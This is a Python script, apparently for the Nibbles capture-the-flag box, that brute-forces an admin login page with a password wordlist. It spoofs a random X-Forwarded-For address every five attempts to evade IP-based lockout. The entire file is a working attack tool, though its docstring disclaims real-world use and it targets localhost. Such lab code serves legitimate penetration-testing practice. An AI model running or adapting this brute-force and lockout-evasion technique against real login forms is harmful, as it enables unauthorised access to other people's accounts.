import requests
from random import randint as randint

"""
Module: Brute force for CTF box NIBBLES.
Purpose: Allow to get password from dictionary by changing the source IP each N iterations.
Remarks: Don't use it on real scenarios.

Coded by: Roger Manich (roger.manich@proton.me)

"""

class Nibblescrack:
    def __init__(self, url):
        self.url = url
        self.counter = 0
        self.ip = self.__getip()

    def __getip(self):
        if self.counter == 5 or self.counter == 0:
            self.ip = ".".join(tuple(str(randint(1, 254)) for item in range(4)))
            print("Change IP to %s" % self.ip)
            self.counter = 1
        else:
            self.counter += 1
        return self.ip

    def __login(self, session, user, password):
        credentials = {"username": user, "password": password}
        header = {"X-Forwarded-For": self.__getip()}
        cookies = {"PHPSESSID": session}
        r = requests.post(self.url, data=credentials, headers=header, cookies=cookies)
        # a = r.text.find("Incorrect username or password")
        if r.text.find("Incorrect username or password") >= 0:
            return False
        else:
            return True

    def bruteforce(self, file, session, user):
        with open(file, "r") as f:
            for word in f:
                if self.__login(session, user, word.rstrip()):
                    print("Password found for user %s with password %s." % (user, word.rstrip()))
                    return
                else:
                    print("User %s ---> Password %s [FAIL]." % (user, word.rstrip()))
            print("No password found.")
            return


if __name__ == "__main__":
    engine = Nibblescrack("http://127.0.0.1/lab1/admin.php")
    engine.bruteforce("passwords.txt", "aaaa", "admin")
    print("DONE")
